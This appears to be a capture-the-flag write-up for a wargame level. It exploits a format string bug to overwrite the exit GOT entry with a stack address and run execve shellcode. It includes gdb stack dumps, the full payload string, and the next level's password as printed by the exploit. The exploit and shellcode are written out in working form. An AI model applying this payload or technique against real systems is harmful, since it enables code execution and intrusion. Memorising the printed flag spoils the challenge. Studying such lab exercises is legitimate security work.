Ok so. The program takes a string from stdin, pass a lower algorithm on each bytes and then sends it to printf. It closes with exit. \
We want to override the address of the PLT of the exit function to jump somewhere. Fortunately, if we put a `NULL` character in our string, the program wont lower whats after. So we thought: lets do a shellcode and let exit be an address in our stack:
```shell
bash$ objdump -R ./level05
...
080497e0 R_386_JUMP_SLOT   exit
...

bash$ gdb ./level05

(gdb) b *main+200
Breakpoint 1 at 0x804850c

(gdb) r < <(python -c 'print "\x90" *100')
Breakpoint 1, 0x0804850c in main ()

(gdb) x/48wx $esp
0xffffd660:     0xffffd688      0x00000064      0xf7fcfac0      0xf7ec3af9
0xffffd670:     0xffffd6af      0xffffd6ae      0x00000000      0xffffffff
0xffffd680:     0xffffd734      0x00000000      0x90909090      0x90909090
0xffffd690:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6c0:     0x90909090      0x90909090      0x90909090      0x90909090
|_ lets write this address so we dont struggle with stack offset
0xffffd6d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6e0:     0x90909090      0x90909090      0x00909090      0x00000063
0xffffd6f0:     0xf7fceff4      0x00000000      0x00000000      0xf7e45513
0xffffd700:     0x00000001      0xffffd794      0xffffd79c      0xf7fd3000
0xffffd710:     0x00000000      0xffffd71c      0xffffd79c      0x00000000

(gdb) d br

(gdb) r < <(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%54968d%10$hn" +  "%76095d%11$hn" + "\x00"*6 + "\x90"*33 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
...
2118 is executing new program: /bin/dash
...
```
Here we write in the PLT of exit the 2 lowest bytes of our stack adress (`0xd6c0`) and then we write the 2 strongest bytes of our stack adress (`0xffff`). We do that by computing (`0x1ffff - 0xd6c0`) to get the second number of bytes to write. We then align we some 0's and write a pool of nop, and then we write our shellcode.
```shell
bash$ python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%54968d%10$hn" +  "%76095d%11$hn" + "\x00"*6 + "\x90"*33 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/exploit

# we need to keep stdin open
bash$ cat /tmp/exploit - | ./level5
...
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

